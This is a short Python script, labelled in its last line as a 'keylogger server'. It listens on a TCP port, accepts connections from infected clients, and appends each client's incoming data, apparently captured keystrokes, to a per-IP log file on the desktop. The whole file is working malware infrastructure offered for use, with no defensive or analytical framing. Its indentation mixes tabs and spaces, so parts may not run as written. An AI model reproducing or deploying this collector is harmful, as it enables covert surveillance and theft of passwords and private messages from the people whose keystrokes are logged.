#-*-coding:utf-8-*-

import socket
import threading
import os
HOST = "192.168.0.24"
PORT = 8089
user = []



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(5)


def N_DATA(c):
    
    print "Server Start"
    ip_address = c.recv(1024)
    ip_address = ip_address.decode("utf-8","ignore")
    print(ip_address)

    file_path = os.path.expanduser('~') + "\\desktop\\"+ip_address+"Log.txt"
    open(file_path,'w').close()
    
    while c:
        f=open(file_path,'r+')
        BACKUP = f.read()
        f.close()
        
        data = c.recv(1024)
	data = data.decode("utf-8","ignore")

        f=open(file_path,'w')
        BACKUP += data
	
	f.write(BACKUP)
	f.close()
        
	
while 1:
    c, addr = s.accept()
    user.append(c)
    threading._start_new_thread(N_DATA,(c,))


#keylogger server
